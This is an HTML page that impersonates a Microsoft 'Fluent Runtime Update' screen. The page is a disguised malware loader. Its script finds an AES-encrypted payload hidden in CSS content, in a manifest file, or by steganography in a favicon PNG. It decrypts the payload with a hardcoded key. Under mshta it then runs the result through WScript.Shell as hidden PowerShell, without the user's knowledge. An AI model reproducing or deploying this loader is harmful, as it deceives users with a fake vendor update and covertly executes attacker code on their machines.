<!-- web/decrypt.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fluent UI Runtime</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    .center {
      text-align: center;
      margin-top: 15%;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #0078d4;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .small {
      font-size: 12px;
      color: gray;
    }
  </style>
</head>
<body>
  <div class="payload"></div>
  <div class="center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="48" />
    <h2>Applying Fluent Runtime Update...</h2>
    <div class="loader"></div>
    <div class="small">This update will complete automatically. Do not close this window.</div>
  </div>

  <script>
    (async () => {
      // Convert hex string to Uint8Array for IV
      function hexToBytes(hex) {
        if (hex.length % 2 !== 0) throw new Error("Invalid hex string length");
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < bytes.length; i++) {
          bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
        }
        return bytes;
      }

      // AES-CBC decrypt using Web Crypto API
      async function aesDecrypt(b64Cipher, hexIV, keyStr) {
        const iv = hexToBytes(hexIV);
        const ciphertext = Uint8Array.from(atob(b64Cipher), c => c.charCodeAt(0));
        const keyBytes = new TextEncoder().encode(keyStr);
        const cryptoKey = await crypto.subtle.importKey(
          "raw",
          keyBytes,
          { name: "AES-CBC", length: 256 },
          false,
          ["decrypt"]
        );
        const decryptedBuffer = await crypto.subtle.decrypt(
          { name: "AES-CBC", iv },
          cryptoKey,
          ciphertext
        );
        return new TextDecoder().decode(decryptedBuffer);
      }

      // Extract payload string from CSS ::after content
      function getPayloadFromCSS() {
        try {
          const cssContent = getComputedStyle(document.querySelector(".payload"), "::after").content;
          if (cssContent) return cssContent.replace(/^\"|\"$/g, "");
        } catch (e) {
          console.warn("Error reading CSS payload:", e);
        }
        return null;
      }

      // Extract payload from manifest.json
      async function getPayloadFromManifest() {
        try {
          const res = await fetch("manifest.json");
          const json = await res.json();
          if (json.payload?.iv && json.payload?.chunks) {
            return `${json.payload.iv}:${json.payload.chunks.join("")}`;
          }
        } catch (e) {
          console.warn("Error fetching manifest payload:", e);
        }
        return null;
      }

      // Extract payload from PNG LSB stego
      async function getPayloadFromPNG() {
        return new Promise((resolve) => {
          const img = new Image();
          img.crossOrigin = "anonymous";
          img.src = "favicon.png";
          img.onload = () => {
            const canvas = document.createElement("canvas");
            canvas.width = img.width;
            canvas.height = img.height;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(img, 0, 0);
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;

            let bits = [];
            for (let i = 0; i < imageData.length; i += 4) {
              bits.push(imageData[i] & 1);
              bits.push(imageData[i + 1] & 1);
              bits.push(imageData[i + 2] & 1);
            }

            let bytes = [];
            for (let i = 0; i < bits.length; i += 8) {
              const byteStr = bits.slice(i, i + 8).join("");
              if (byteStr === "00000000") break;
              bytes.push(String.fromCharCode(parseInt(byteStr, 2)));
            }
            resolve(bytes.join(""));
          };
          img.onerror = () => {
            console.warn("Error loading favicon.png");
            resolve(null);
          };
        });
      }

      // Main logic
      let encrypted = getPayloadFromCSS();
      if (!encrypted) encrypted = await getPayloadFromManifest();
      if (!encrypted) encrypted = await getPayloadFromPNG();

      if (!encrypted) {
        console.error("No encrypted payload found");
        return;
      }

      const HARDCODED_KEY = "Zxcvbnm1234567890Zxcvbnm12345678"; // exactly 32 chars AES-256 key

      try {
        if (!encrypted.includes(":")) throw new Error("Payload format invalid");
        const [iv, b64] = encrypted.split(":");
        const decrypted = await aesDecrypt(b64, iv, HARDCODED_KEY);

        // Only mshta environment supports ActiveXObject for shell execution
        if (typeof ActiveXObject !== "undefined") {
          const shell = new ActiveXObject("WScript.Shell");
          shell.Run("powershell -nop -w hidden -c " + '"' + decrypted + '"');
        } else {
          console.log("ActiveXObject not available, decrypted payload:");
          console.log(decrypted);
        }
      } catch (e) {
        console.error("Decrypt failed:", e);
      }
    })();
  </script>
</body>
</html>
